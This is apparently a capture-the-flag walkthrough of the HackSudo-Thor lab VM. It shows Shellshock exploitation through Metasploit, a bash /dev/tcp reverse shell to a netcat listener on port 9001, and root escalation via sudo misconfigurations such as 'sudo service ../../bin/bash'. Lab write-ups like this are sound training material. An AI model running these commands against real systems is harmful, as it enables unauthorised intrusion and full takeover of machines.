                                                   #       HackSudo-Thor WalkThrough - Faton Haxhiu


First in order to find the IP Address of the machine we run netdiscover command in our case is 10.0.2.15. 

![1 1](https://github.com/FatonHaxhiu/HackSudo-Thor/assets/67721504/bfeed9db-c1f6-48e3-b21b-801be763bb36)

When we navigate to source good of the website we found that there may be a shellshock vulnerability (Apache server) based on cgi-bin.

![1](https://github.com/FatonHaxhiu/HackSudo-Thor/assets/67721504/9be0c7f1-efd9-4745-b1e8-3cdcf4d9f743)

We run dirb http://10.0.2.15/cgi-bin -x .sh to find vulnerability which can have a module in metasploit.

![2](https://github.com/FatonHaxhiu/HackSudo-Thor/assets/67721504/20e90d57-d9c1-4487-a09b-a6393957abf8)

After that we open metasploit and we use multi/http/apache_mod_cgi_bash_env_exec exploit. 
Follow these steps in metasploit:
-search shellshoc exploit 
-use  multi/http/apache_mod_cgi_bash_env_exec
-set host 'IP for victim'
-set targeturi /cgi-bin/shell.sh
-run 
We have a shell created!

![3](https://github.com/FatonHaxhiu/HackSudo-Thor/assets/67721504/44a80511-fc02-4db3-a507-b3b899793408)

If you are not fan of shell e metasploit you can redirect shell by open a netcat connection. 
Open another window in terminal a open netcat connection in our case we use port 9001 nc -nlvp 9001

![5](https://github.com/FatonHaxhiu/HackSudo-Thor/assets/67721504/a7d9f20b-2f47-45e7-89c1-3008554c95e9)

After you have open your netcat in shell in metasploit write: bash -c 'bash -i >& /dev/tcp/(host IP)/9001 0>&1'. This is going to open shell in your netcat window. 

![4](https://github.com/FatonHaxhiu/HackSudo-Thor/assets/67721504/fc0322af-ce47-4e5b-838c-2442f8529586)

Now we gonna try Privilege escalation to us, first we will check what can find in shell such us useful information or scripts. We can do this by doing sudo -l we found there a scrip we can execute /home/thor/./hammer.sh
We go ahead and we execute it sudo -u /home/thor/./hammer.sh we can scripts it need code to execute this can lead us to get full-shell access this we can do by using bash as main input. 

![7](https://github.com/FatonHaxhiu/HackSudo-Thor/assets/67721504/b69502a8-b20b-41b5-95b7-d322e451b5a0)

Running this command SHELL=/bin/bash script -q /dev/null is going to grant root access. 

We have come to the part of Root privilege escalation this can be done by just running this command: sudo service ../../bin/bash

![8](https://github.com/FatonHaxhiu/HackSudo-Thor/assets/67721504/edd5ec0f-3679-46c3-9be7-da79f5a23b31)


Congratulations you have now full access. 

